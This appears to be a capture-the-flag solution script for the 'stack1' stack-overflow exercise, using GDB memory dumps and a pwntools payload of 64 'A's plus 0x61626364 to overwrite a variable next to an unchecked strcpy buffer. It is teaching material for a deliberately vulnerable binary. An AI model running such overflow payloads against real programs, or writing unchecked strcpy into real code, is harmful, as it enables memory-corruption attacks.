#!/usr/bin/python
# -*- coding: utf-8 -*-

#Author : Ori0n__
#Team : TheFlagIsNotHere

from pwn import *

#Goal : Change the value of the variable "modified" by 0x61626364.
#Let's look at the source code:

"""
volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
"""

#The modified variable is created after a buffer of 64 bytes.
#The problem with the strcpy function is that when it copies, 
#strcpy does not check the buffer size, which can lead to buffer overflows. 
#
#
#man strcpy:
#If the destination string of a strcpy() is not large enough, 
#then anything might happen. Overflowing fixed-length string buffers is a 
#favorite cracker technique for taking complete control of the machine. 
#
#Any time a program reads or copies data into a buffer, 
#the program first needs to check that there's enough space. 
#This may be unnecessary if you can show that overflow is impossible,
#but be careful: programs can get changed over time, 
#in ways that may make the impossible possible.
#
#
#Try with GDB :
#
#gdb ./stack1
#disass main
#breakpoint * 0x080484a7(address after call strcpy@plt)
#run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(64 times)
#x/50xw $esp
#0xffffd240:	0xffffd25c	0xffffd4f4	0x00000000	0xdd3e1f00
#0xffffd250:	0xffffffff	0xffffd4c7	0xf7dc6138	0x41414141
#0xffffd260:	0x41414141	0x41414141	0x41414141	0x41414141
#0xffffd270:	0x41414141	0x41414141	0x41414141	0x41414141
#0xffffd280:	0x41414141	0x41414141	0x41414141	0x41414141
#0xffffd290:	0x41414141	0x41414141	0x41414141	0x00000000
#
#We notice our A 64 times, and then we notice 0x00000000 
#which corresponds to the value of the variable modified. 
#
#So let's try to modify this variable, by sending the following 'A' 64 times and 0x61626364 
#in order to have the good value for 'modified' variable.
#
#gdb ./stack1
#breakpoint * 0x080484a7(address after call strcpy@plt)
#run $(python2 -c 'print "A"*64+"\x64\x63\x62\x61"')
#x/50xw $esp
#0xffffd240:	0xffffd25c	0xffffd4f0	0x00000000	0xbebc1000
#0xffffd250:	0xffffffff	0xffffd4c3	0xf7dc6138	0x41414141
#0xffffd260:	0x41414141	0x41414141	0x41414141	0x41414141
#0xffffd270:	0x41414141	0x41414141	0x41414141	0x41414141
#0xffffd280:	0x41414141	0x41414141	0x41414141	0x41414141
#0xffffd290:	0x41414141	0x41414141	0x41414141	0x61626364
#continue
#you have correctly got the variable to the right value

#Exploit with pwntools :
ELF("./stack1")
binary = process(["./stack1","A"*64+p32(0x61626364)])
result = binary.recv(1024)
print result
